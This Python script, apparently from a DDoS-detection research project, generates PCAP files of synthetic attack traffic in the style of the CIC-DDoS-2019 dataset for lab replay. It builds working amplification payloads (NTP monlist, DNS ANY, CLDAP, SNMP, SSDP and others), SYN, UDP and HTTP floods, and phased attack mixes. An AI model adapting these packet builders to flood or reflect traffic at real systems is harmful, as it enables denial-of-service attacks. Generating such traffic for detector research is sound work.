#!/usr/bin/env python3
"""
MIRA CIC-DDoS-2019 Attack Generator v4.0 (Multiprocessing)

Generates all attack types from the CIC-DDoS-2019 dataset:
- PortMap (UDP 111) - RPC portmapper amplification
- NetBIOS (UDP 137/138) - NetBIOS name service amplification
- LDAP (TCP/UDP 389) - CLDAP amplification
- MSSQL (UDP 1434) - SQL Server resolution amplification
- UDP Flood - Generic UDP flood
- UDP-Lag - UDP flood with larger packets (lag attack)
- SYN Flood - TCP SYN flood
- NTP (UDP 123) - NTP monlist amplification
- DNS (UDP 53) - DNS ANY query amplification
- SNMP (UDP 161) - SNMP GetBulk amplification
- SSDP (UDP 1900) - SSDP M-SEARCH amplification
- WebDDoS (TCP 80/443) - HTTP GET/POST flood
- TFTP (UDP 69) - TFTP read request flood

Features:
- MULTIPROCESSING: Parallel packet generation with multiple workers
- CloudLab internal network IPs (10.10.3.x for attackers)
- Configurable attack phases and intensity
- Timestamp compression for high-speed replay
- Compatible with dpdk_pcap_sender_v2 for 12 Gbps replay

Usage:
    python3 generate_cicdos2019_attacks.py --output attack.pcap --packets 10000000 --workers 8

Author: MIRA Project - CIC-DDoS-2019 Attack Generation
"""

import argparse
import random
import struct
import time
import os
import multiprocessing as mp
from multiprocessing import Pool, Manager
from functools import partial
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether
from scapy.layers.dns import DNS, DNSQR

# ============================================================================
# Attack Type Definitions
# ============================================================================

ATTACK_TYPES = [
    'portmap', 'netbios', 'ldap', 'mssql', 'udp', 'udp_lag',
    'syn', 'ntp', 'dns', 'snmp', 'ssdp', 'webddos', 'tftp', 'mixed'
]

# ============================================================================
# Attack Packet Generation Functions
# ============================================================================

def generate_portmap_attack(src_ip, dst_ip, src_mac, dst_mac):
    """PortMap/RPC amplification attack (UDP port 111)"""
    rpc_call = struct.pack('>I', random.randint(1, 0xFFFFFFFF))  # XID
    rpc_call += struct.pack('>I', 0)  # Call
    rpc_call += struct.pack('>I', 2)  # RPC version 2
    rpc_call += struct.pack('>I', 100000)  # Portmapper program
    rpc_call += struct.pack('>I', 2)  # Version 2
    rpc_call += struct.pack('>I', random.choice([3, 4]))  # GETPORT/DUMP
    rpc_call += struct.pack('>I', 0) * 4  # Auth

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=111) / \
          Raw(load=rpc_call)
    return [pkt]


def generate_netbios_attack(src_ip, dst_ip, src_mac, dst_mac):
    """NetBIOS amplification attack (UDP ports 137/138)"""
    port = random.choice([137, 138])

    if port == 137:
        nbns_query = struct.pack('>H', random.randint(1, 0xFFFF))
        nbns_query += struct.pack('>H', 0x0000)
        nbns_query += struct.pack('>H', 1)
        nbns_query += struct.pack('>H', 0) * 3
        nbns_query += b'\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00'
        nbns_query += struct.pack('>H', 0x0021)
        nbns_query += struct.pack('>H', 0x0001)
    else:
        nbns_query = bytes([random.randint(0, 255) for _ in range(64)])

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=port) / \
          Raw(load=nbns_query)
    return [pkt]


def generate_ldap_attack(src_ip, dst_ip, src_mac, dst_mac):
    """CLDAP amplification attack (UDP port 389)"""
    ldap_search = bytes([
        0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00,
        0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02, 0x01, 0x00,
        0x02, 0x01, 0x00, 0x01, 0x01, 0x00, 0x87, 0x0b,
        0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73, 0x73,
        0x30, 0x00
    ])

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=389) / \
          Raw(load=ldap_search)
    return [pkt]


def generate_mssql_attack(src_ip, dst_ip, src_mac, dst_mac):
    """MSSQL amplification attack (UDP port 1434)"""
    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=1434) / \
          Raw(load=b'\x02')
    return [pkt]


def generate_udp_flood(src_ip, dst_ip, src_mac, dst_mac):
    """Generic UDP flood attack"""
    payload = bytes([random.randint(0, 255) for _ in range(random.randint(64, 512))])
    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535)) / \
          Raw(load=payload)
    return [pkt]


def generate_udp_lag(src_ip, dst_ip, src_mac, dst_mac):
    """UDP-Lag attack (larger packets)"""
    payload = bytes([random.randint(0, 255) for _ in range(random.randint(1000, 1400))])
    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535)) / \
          Raw(load=payload)
    return [pkt]


def generate_syn_flood(src_ip, dst_ip, src_mac, dst_mac):
    """TCP SYN flood attack"""
    target_ports = [80, 443, 22, 21, 25, 53, 110, 143, 3306, 5432, 8080, 8443]
    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          TCP(sport=random.randint(1024, 65535),
              dport=random.choice(target_ports),
              flags='S',
              seq=random.randint(1000, 4000000000),
              window=random.choice([1024, 2048, 4096, 8192, 16384, 65535]))
    return [pkt]


def generate_ntp_attack(src_ip, dst_ip, src_mac, dst_mac):
    """NTP amplification attack (UDP port 123)"""
    ntp_monlist = bytes([0x17, 0x00, 0x2a, 0x00, 0x00, 0x00, 0x00, 0x00])
    ntp_monlist += b'\x00' * 40

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=123) / \
          Raw(load=ntp_monlist)
    return [pkt]


def generate_dns_attack(src_ip, dst_ip, src_mac, dst_mac):
    """DNS amplification attack (UDP port 53)"""
    domains = ['google.com', 'facebook.com', 'amazon.com', 'microsoft.com',
               'cloudflare.com', 'akamai.com', 'netflix.com', 'apple.com']
    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=53) / \
          DNS(rd=1, qd=DNSQR(qname=random.choice(domains), qtype=255))
    return [pkt]


def generate_snmp_attack(src_ip, dst_ip, src_mac, dst_mac):
    """SNMP amplification attack (UDP port 161)"""
    snmp_request = bytes([
        0x30, 0x26, 0x02, 0x01, 0x01,
        0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63,
        0xa5, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
        0x02, 0x01, 0x00, 0x02, 0x02, 0x07, 0xd0,
        0x30, 0x0a, 0x30, 0x08,
        0x06, 0x04, 0x2b, 0x06, 0x01, 0x02, 0x05, 0x00
    ])

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=161) / \
          Raw(load=snmp_request)
    return [pkt]


def generate_ssdp_attack(src_ip, dst_ip, src_mac, dst_mac):
    """SSDP amplification attack (UDP port 1900)"""
    ssdp_msearch = (
        b"M-SEARCH * HTTP/1.1\r\n"
        b"HOST: 239.255.255.250:1900\r\n"
        b"MAN: \"ssdp:discover\"\r\n"
        b"MX: 2\r\n"
        b"ST: ssdp:all\r\n\r\n"
    )

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=1900) / \
          Raw(load=ssdp_msearch)
    return [pkt]


def generate_webddos_attack(src_ip, dst_ip, src_mac, dst_mac):
    """WebDDoS attack (TCP ports 80/443)"""
    sport = random.randint(49152, 65535)
    dport = random.choice([80, 443])
    seq = random.randint(1000, 4000000000)

    http_requests = [
        b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n",
        b"GET /index.html HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\n\r\n",
    ]

    syn = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          TCP(sport=sport, dport=dport, flags='S', seq=seq)

    http_req = Ether(src=src_mac, dst=dst_mac) / \
               IP(src=src_ip, dst=dst_ip) / \
               TCP(sport=sport, dport=dport, flags='PA', seq=seq+1, ack=1) / \
               Raw(load=random.choice(http_requests))

    return [syn, http_req]


def generate_tftp_attack(src_ip, dst_ip, src_mac, dst_mac):
    """TFTP attack (UDP port 69)"""
    filenames = [b'test.txt', b'config.cfg', b'boot.bin', b'firmware.img']
    tftp_rrq = struct.pack('>H', 1) + random.choice(filenames) + b'\x00octet\x00'

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=69) / \
          Raw(load=tftp_rrq)
    return [pkt]


# Attack generator dispatch table
ATTACK_GENERATORS = {
    'portmap': generate_portmap_attack,
    'netbios': generate_netbios_attack,
    'ldap': generate_ldap_attack,
    'mssql': generate_mssql_attack,
    'udp': generate_udp_flood,
    'udp_lag': generate_udp_lag,
    'syn': generate_syn_flood,
    'ntp': generate_ntp_attack,
    'dns': generate_dns_attack,
    'snmp': generate_snmp_attack,
    'ssdp': generate_ssdp_attack,
    'webddos': generate_webddos_attack,
    'tftp': generate_tftp_attack,
}

# ============================================================================
# Attack Phase Configuration (CIC-DDoS-2019 style)
# ============================================================================

ATTACK_PHASES = [
    # Phase 1: Amplification attacks (30%)
    {
        'name': "Amplification Wave",
        'duration_pct': 30,
        'attack_weights': {
            'ntp': 15, 'dns': 15, 'snmp': 10, 'ssdp': 10,
            'portmap': 10, 'netbios': 10, 'ldap': 10, 'mssql': 10, 'tftp': 10
        },
        'intensity': 3.0,
        'jitter_ms': 10
    },
    # Phase 2: Volumetric flood (40%)
    {
        'name': "Volumetric Flood",
        'duration_pct': 40,
        'attack_weights': {
            'syn': 30, 'udp': 25, 'udp_lag': 20, 'webddos': 15, 'dns': 5, 'ntp': 5
        },
        'intensity': 5.0,
        'jitter_ms': 5
    },
    # Phase 3: Mixed attack (30%)
    {
        'name': "Mixed Attack",
        'duration_pct': 30,
        'attack_weights': {
            'syn': 15, 'udp': 10, 'udp_lag': 10, 'webddos': 10,
            'ntp': 10, 'dns': 10, 'snmp': 5, 'ssdp': 5,
            'portmap': 5, 'netbios': 5, 'ldap': 5, 'mssql': 5, 'tftp': 5
        },
        'intensity': 4.0,
        'jitter_ms': 20
    },
]


def get_weighted_attacks(attack_weights):
    """Return weighted list of attack types"""
    attacks = []
    for attack_type, weight in attack_weights.items():
        attacks.extend([attack_type] * weight)
    return attacks


# ============================================================================
# Worker Function for Multiprocessing
# ============================================================================

def worker_generate_packets(worker_id, num_packets, attack_type, intensity,
                            src_mac, dst_mac, attacker_ips, target_ip,
                            base_timestamp, base_interval):
    """
    Worker function that generates a portion of packets.
    Each worker generates num_packets packets independently.
    """
    random.seed(worker_id + int(time.time() * 1000) % 10000)

    packets = []
    attack_stats = {at: 0 for at in ATTACK_GENERATORS.keys()}
    current_timestamp = base_timestamp + (worker_id * num_packets * base_interval / intensity)

    if attack_type == 'mixed':
        # Calculate packets per phase
        phase_idx = 0
        packets_generated = 0

        for phase in ATTACK_PHASES:
            phase_packets = int(num_packets * phase['duration_pct'] / 100)
            phase_attacks = get_weighted_attacks(phase['attack_weights'])
            phase_intensity = phase['intensity']
            jitter_ms = phase['jitter_ms']

            for _ in range(phase_packets):
                if packets_generated >= num_packets:
                    break

                attacker_ip = random.choice(attacker_ips)
                selected_attack = random.choice(phase_attacks)
                generator = ATTACK_GENERATORS.get(selected_attack, generate_syn_flood)
                flow_packets = generator(attacker_ip, target_ip, src_mac, dst_mac)

                for pkt in flow_packets:
                    jitter = (random.random() - 0.5) * (jitter_ms / 1000.0)
                    interval = base_interval / (phase_intensity * intensity)
                    current_timestamp += interval + jitter
                    pkt.time = current_timestamp

                packets.extend(flow_packets)
                attack_stats[selected_attack] += len(flow_packets)
                packets_generated += len(flow_packets)
    else:
        # Single attack type
        generator = ATTACK_GENERATORS.get(attack_type, generate_syn_flood)

        for _ in range(num_packets):
            attacker_ip = random.choice(attacker_ips)
            flow_packets = generator(attacker_ip, target_ip, src_mac, dst_mac)

            for pkt in flow_packets:
                jitter = (random.random() - 0.5) * 0.001
                interval = base_interval / intensity
                current_timestamp += interval + jitter
                pkt.time = current_timestamp

            packets.extend(flow_packets)
            attack_stats[attack_type] += len(flow_packets)

    # Trim to exact count
    packets = packets[:num_packets]

    return worker_id, packets, attack_stats


def worker_wrapper(args):
    """Wrapper for multiprocessing Pool.map"""
    return worker_generate_packets(*args)


# ============================================================================
# Main Generation Function with Multiprocessing
# ============================================================================

def generate_cicdos2019_attacks_parallel(output_file, num_packets, attack_type, intensity,
                                         src_mac, dst_mac, attacker_range, target_ip,
                                         num_attackers=200, speedup=1, num_workers=8):
    """
    Generate CIC-DDoS-2019 style attack traffic using multiprocessing
    """

    print("=" * 80)
    print("MIRA CIC-DDoS-2019 Attack Generator v4.0 (MULTIPROCESSING)")
    print("=" * 80)
    print(f"Attack type:      {attack_type.upper()}")
    print(f"Intensity:        {intensity}x")
    print(f"Total packets:    {num_packets:,}")
    print(f"Output file:      {output_file}")
    print(f"Workers:          {num_workers}")
    print(f"Attacker range:   {attacker_range} (10.10.3.x = attack traffic)")
    print(f"Target IP:        {target_ip}")
    print(f"Source MAC:       {src_mac}")
    print(f"Dest MAC:         {dst_mac}")
    print(f"Botnet size:      {num_attackers} IPs")
    print(f"Speedup:          {speedup}x")
    print("")

    # Parse attacker IP range
    base_ip = attacker_range.split('/')[0]
    ip_parts = base_ip.split('.')
    base_ip_int = (int(ip_parts[0]) << 24) | (int(ip_parts[1]) << 16) | \
                  (int(ip_parts[2]) << 8) | int(ip_parts[3])

    # Generate attacker IPs
    attacker_ips = []
    for i in range(num_attackers):
        attacker_ip_int = base_ip_int + (i % 256)
        attacker_ip = f"{(attacker_ip_int >> 24) & 0xFF}.{(attacker_ip_int >> 16) & 0xFF}." \
                     f"{(attacker_ip_int >> 8) & 0xFF}.{attacker_ip_int & 0xFF}"
        attacker_ips.append(attacker_ip)

    # Calculate packets per worker
    packets_per_worker = num_packets // num_workers
    remainder = num_packets % num_workers

    base_timestamp = time.time()
    base_interval = 0.000001  # 1 microsecond

    # Prepare worker arguments
    worker_args = []
    for w in range(num_workers):
        worker_packets = packets_per_worker + (1 if w < remainder else 0)
        worker_args.append((
            w, worker_packets, attack_type, intensity,
            src_mac, dst_mac, attacker_ips, target_ip,
            base_timestamp, base_interval
        ))

    print(f"Distributing {num_packets:,} packets across {num_workers} workers...")
    print(f"  Packets per worker: ~{packets_per_worker:,}")
    print("")

    # Launch workers
    start_time = time.time()

    print(f"Starting {num_workers} worker processes...")
    with Pool(processes=num_workers) as pool:
        results = pool.map(worker_wrapper, worker_args)

    generation_time = time.time() - start_time
    print(f"\nPacket generation completed in {generation_time:.2f} seconds")
    print(f"  Generation rate: {num_packets / generation_time:,.0f} pkt/s")

    # Merge results
    print("\nMerging packets from all workers...")
    all_packets = []
    total_stats = {at: 0 for at in ATTACK_GENERATORS.keys()}

    for worker_id, packets, stats in sorted(results, key=lambda x: x[0]):
        all_packets.extend(packets)
        for attack, count in stats.items():
            total_stats[attack] += count
        print(f"  Worker {worker_id}: {len(packets):,} packets")

    # Sort by timestamp to interleave packets from different workers
    print("\nSorting packets by timestamp...")
    all_packets.sort(key=lambda p: p.time)

    # Trim to exact packet count
    all_packets = all_packets[:num_packets]

    print(f"\nTotal packets: {len(all_packets):,}")

    # Normalize timestamps (start from 0)
    print("\nNormalizing timestamps...")
    if all_packets:
        first_time = all_packets[0].time
        for pkt in all_packets:
            pkt.time = pkt.time - first_time

    # Apply timestamp compression
    if speedup > 1:
        print(f"Applying {speedup}x timestamp compression...")
        for pkt in all_packets:
            pkt.time = pkt.time / speedup

        if all_packets:
            duration = all_packets[-1].time - all_packets[0].time
            print(f"  Compressed duration: {duration:.2f} seconds")

    # Write PCAP
    print(f"\nWriting to {output_file}...")
    write_start = time.time()
    wrpcap(output_file, all_packets)
    write_time = time.time() - write_start

    file_size = os.path.getsize(output_file)
    print(f"  File size: {file_size / (1024*1024):.2f} MB")
    print(f"  Write time: {write_time:.2f} seconds")
    print(f"  Write rate: {file_size / write_time / (1024*1024):.2f} MB/s")

    # Print statistics
    print("\n" + "=" * 80)
    print("Attack Distribution:")
    print("=" * 80)

    port_info = {
        'portmap': 'UDP 111', 'netbios': 'UDP 137/138', 'ldap': 'UDP 389',
        'mssql': 'UDP 1434', 'udp': 'UDP random', 'udp_lag': 'UDP random (large)',
        'syn': 'TCP SYN', 'ntp': 'UDP 123', 'dns': 'UDP 53', 'snmp': 'UDP 161',
        'ssdp': 'UDP 1900', 'webddos': 'TCP 80/443', 'tftp': 'UDP 69',
    }

    for attack, count in sorted(total_stats.items(), key=lambda x: -x[1]):
        if count > 0:
            pct = count * 100 // len(all_packets) if all_packets else 0
            print(f"  {attack.upper():12s} ({port_info.get(attack, '')}): {count:10,} pkts ({pct:2d}%)")

    total_time = time.time() - start_time
    print("\n" + "=" * 80)
    print("Generation Summary:")
    print("=" * 80)
    print(f"  Total packets:     {len(all_packets):,}")
    print(f"  Total time:        {total_time:.2f} seconds")
    print(f"  Overall rate:      {len(all_packets) / total_time:,.0f} pkt/s")
    print(f"  File size:         {file_size / (1024*1024):.2f} MB")
    print(f"  Workers used:      {num_workers}")
    print("")
    print("Replay command:")
    print(f"  sudo ./dpdk_pcap_sender_v2 -l 0-7 -n 4 -w <PCI> -- \\")
    print(f"      --pcap-dir <dir> --rate-gbps 12")
    print("")

    return len(all_packets)


def main():
    parser = argparse.ArgumentParser(
        description='Generate CIC-DDoS-2019 style attack traffic (Multiprocessing)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Supported Attack Types:
  portmap  - RPC Portmapper amplification (UDP 111)
  netbios  - NetBIOS amplification (UDP 137/138)
  ldap     - CLDAP amplification (UDP 389)
  mssql    - MSSQL amplification (UDP 1434)
  udp      - Generic UDP flood
  udp_lag  - UDP flood with large packets
  syn      - TCP SYN flood
  ntp      - NTP monlist amplification (UDP 123)
  dns      - DNS ANY query amplification (UDP 53)
  snmp     - SNMP GetBulk amplification (UDP 161)
  ssdp     - SSDP M-SEARCH amplification (UDP 1900)
  webddos  - HTTP GET/POST flood (TCP 80/443)
  tftp     - TFTP read request flood (UDP 69)
  mixed    - All attack types (phased)

Examples:
  # Mixed attack with 8 workers (recommended):
  python3 generate_cicdos2019_attacks.py -n 10000000 -w 8 -o attack_mixed.pcap

  # NTP amplification with 4 workers:
  python3 generate_cicdos2019_attacks.py -t ntp -n 5000000 -w 4 -o attack_ntp.pcap

  # High intensity SYN flood with speedup:
  python3 generate_cicdos2019_attacks.py -t syn -i 5.0 -s 100 -w 8 -n 10000000 -o attack_syn.pcap
        """
    )

    parser.add_argument('--output', '-o', default='attack_cicdos2019.pcap',
                       help='Output PCAP file')
    parser.add_argument('--packets', '-n', type=int, default=10000000,
                       help='Number of packets (default: 10000000)')
    parser.add_argument('--attack-type', '-t', choices=ATTACK_TYPES, default='mixed',
                       help='Attack type (default: mixed)')
    parser.add_argument('--intensity', '-i', type=float, default=1.0,
                       help='Intensity multiplier 1.0-5.0 (default: 1.0)')
    parser.add_argument('--workers', '-w', type=int, default=8,
                       help='Number of worker processes (default: 8)')
    parser.add_argument('--src-mac', default='00:00:00:00:00:02',
                       help='Source MAC (default: 00:00:00:00:00:02)')
    parser.add_argument('--dst-mac', default='0c:42:a1:dd:57:90',
                       help='Destination MAC - detector NIC (default: 0c:42:a1:dd:57:90)')
    parser.add_argument('--attacker-range', default='10.10.3.0/24',
                       help='Attacker IP range (default: 10.10.3.0/24)')
    parser.add_argument('--target-ip', default='10.10.1.2',
                       help='Target IP (default: 10.10.1.2)')
    parser.add_argument('--attackers', type=int, default=200,
                       help='Number of attacker IPs (default: 200)')
    parser.add_argument('--speedup', '-s', type=float, default=1.0,
                       help='Timestamp compression factor (default: 1.0)')

    args = parser.parse_args()

    if args.intensity < 1.0 or args.intensity > 5.0:
        print("Error: intensity must be between 1.0 and 5.0")
        return 1

    if args.workers < 1 or args.workers > 64:
        print("Error: workers must be between 1 and 64")
        return 1

    generate_cicdos2019_attacks_parallel(
        args.output,
        args.packets,
        args.attack_type,
        args.intensity,
        args.src_mac,
        args.dst_mac,
        args.attacker_range,
        args.target_ip,
        args.attackers,
        args.speedup,
        args.workers
    )

    return 0


if __name__ == '__main__':
    exit(main())
